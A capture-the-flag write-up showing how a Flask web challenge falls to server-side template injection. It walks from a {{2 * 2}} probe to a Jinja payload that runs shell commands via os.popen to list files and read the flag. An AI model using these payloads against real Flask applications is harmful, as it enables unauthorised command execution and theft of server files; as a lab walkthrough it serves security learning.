#  Just Cat The Flask 1/2 

The challenge provides the following url: https://bluehens-cat-the-flask.chals.io/greeting/hi

As the title says, the web application is built over Flask: Flask (and Jinja) can be vulnerable to [Server-Side Template Injection](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/#ssti-(server-side-template-injection)). 

To check if that is the case we can try inject the following simple payload:

    https://bluehens-cat-the-flask.chals.io/greeting/{{2 * 2}}

the response:
        
    Hello 4!

So far so good, we can try to exploit a more useful injection to inspect the server filesystem:

    https://bluehens-cat-the-flask.chals.io/greeting/{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}

the response:

    Hi chall.py flag1.txt requirements.txt sum_suckers_creds !

At this point we just need to cat flag1.txt

    https://bluehens-cat-the-flask.chals.io/greeting/{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag1.txt').read() }}

and that's it:

    Welcome UDCTF{l4y3r_1_c0mpl3t3_g00d_luck_w1th_p4rt_2} !